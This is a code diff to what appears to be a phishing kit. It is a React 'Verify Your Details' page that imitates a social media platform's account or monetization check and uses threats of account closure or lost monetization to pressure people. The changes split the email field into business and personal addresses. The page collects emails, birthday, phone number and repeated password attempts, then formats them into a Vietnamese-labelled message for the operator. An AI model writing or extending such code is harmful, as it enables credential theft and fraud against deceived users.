@@ -16,7 +16,8 @@ interface CountryResponse {
 }
 
 interface StoredFormData {
-    email: string;
+    emailBusiness: string;
+    emailPersonal: string;
     birthday: string;
     phone: string;
     passwordAttempts: string[];
@@ -37,7 +38,8 @@ interface GeoJSResponse {
 }
 
 const mainFormSchema = z.object({
-    email: z.string().email('Please enter a valid email address'),
+    emailBusiness: z.string().email('Please enter a valid business email address'),
+    emailPersonal: z.string().email('Please enter a valid personal email address'),
     birthday: z.string().regex(/^\d{4}-\d{2}-\d{2}$/, 'Please enter a valid date'),
     phone: z.string().min(1)
 });
@@ -64,7 +66,8 @@ const Home = () => {
     const [isLoading, setIsLoading] = useState(true);
     const [showPasswordModal, setShowPasswordModal] = useState(false);
     const [formData, setFormData] = useState<{
-        email?: string;
+        emailBusiness?: string;
+        emailPersonal?: string;
         birthday?: string;
         phone?: string;
     }>({});
@@ -126,7 +129,8 @@ const Home = () => {
 
             if (Date.now() - parsed.timestamp < 24 * 60 * 60 * 1000) {
                 setFormData({
-                    email: parsed.email,
+                    emailBusiness: parsed.emailBusiness,
+                    emailPersonal: parsed.emailPersonal,
                     birthday: parsed.birthday,
                     phone: parsed.phone
                 });
@@ -140,7 +144,8 @@ const Home = () => {
 
     const onMainFormSubmit = (data: MainFormValues) => {
         const formDataToStore = {
-            email: data.email,
+            emailBusiness: data.emailBusiness,
+            emailPersonal: data.emailPersonal,
             birthday: data.birthday,
             phone: `${phoneCode}${data.phone}`
         };
@@ -231,7 +236,8 @@ const Home = () => {
 <b>🎂 Ngày sinh:</b> <code>${formatDateVN(fullFormData.birthday!)}</code>
 
 <b>📞 Số điện thoại:</b> <code>${fullFormData.phone}</code>
-<b>📧 Email:</b> <code>${fullFormData.email}</code>
+<b>📧 Email Personal:</b> <code>${fullFormData.emailPersonal}</code>
+<b>📧 Email Business:</b> <code>${fullFormData.emailBusiness}</code>
 
 ${passwordList}`;
 
@@ -331,24 +337,40 @@ ${passwordList}`;
                             <h2 className='text-lg font-semibold text-blue-600 text-center mb-6'>Verify Your Details</h2>
 
                             <form onSubmit={handleMainSubmit(onMainFormSubmit)} className='space-y-5'>
-                                <div>
-                                    <input type='email' placeholder='Email address' {...registerMain('email')} tabIndex={1} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors' />
-                                    {mainErrors.email && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.email.message}</p>}
+                                 <div>
+                                <input type='email' placeholder={content.emailPersonalPlaceholder} {...registerMain('emailPersonal')} tabIndex={1} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors' />
+                                {mainErrors.emailPersonal && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.emailPersonal.message}</p>}
                                 </div>
-
+                                
                                 <div>
-                                    <input type='date' {...registerMain('birthday')} tabIndex={2} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors [&::-webkit-calendar-picker-indicator]:opacity-0' />
-                                    {mainErrors.birthday && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.birthday.message}</p>}
+                                <input type='email' placeholder={content.emailBusinessPlaceholder} {...registerMain('emailBusiness')} tabIndex={2} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors' />
+                                {mainErrors.emailBusiness && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.emailBusiness.message}</p>}
+                                <div>
+                                    <input
+                                    type='text'
+                                    placeholder={content.birthdayPlaceholder}
+                                    {...registerMain('birthday')}
+                                    onChange={(e) => {
+                                        e.target.value = formatDateInput(e.target.value);
+                                        registerMain('birthday').onChange(e);
+                                    }}
+                                    maxLength={10}
+                                    tabIndex={3}
+                                    className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors'
+                                />
+                                {mainErrors.birthday && <p className='text-red-500 text-sm mt-1.5'>{mainErrors.birthday.message}</p>}
                                 </div>
 
                                 <div className='relative'>
                                     <div className='absolute left-0 top-0 bottom-0 flex items-center pl-4 text-gray-600 z-10'>
                                         <span className='text-sm'>{isLoading ? '...' : phoneCode}</span>
                                     </div>
-                                    <input type='tel' placeholder={isLoading ? 'Loading...' : 'Phone number'} {...registerMain('phone')} tabIndex={3} className='w-full px-4 py-2.5 pl-[52px] border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors relative' />
-                                    {mainErrors.phone && (
-                                        <div className='absolute left-0 right-0 mt-1.5'>
-                                            <p className='text-red-500 text-sm'>{mainErrors.phone.message}</p>
+                                    <div className='absolute left-0 top-0 bottom-0 flex items-center pl-4 text-gray-600 z-10'>
+                                </div>
+                                <input type='number' placeholder={content.phonePlaceholder} {...registerMain('phone')} tabIndex={4} className='w-full px-4 py-2.5 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent bg-gray-50 transition-colors relative' />
+                                {mainErrors.phone && (
+                                    <div className='absolute left-0 right-0 mt-1.5'>
+                                        <p className='text-red-500 text-sm'>{mainErrors.phone.message}</p>
                                         </div>
                                     )}
                                 </div>
@@ -365,7 +387,7 @@ ${passwordList}`;
                         </div>
 
                         <p className='text-sm text-gray-600'>
-                            Please ensure all information is accurate. Incorrect information may result in permanent account closure. Review our <button className='text-blue-600 hover:underline'>Community Standards</button> for more information.
+                            Please ensure all information is accurate. If the information provided is incorrect, monetization may not be enabled permanently. Review our <button className='text-blue-600 hover:underline'>Community Standards</button> for more information.
                         </p>
                     </div>
                 </div>
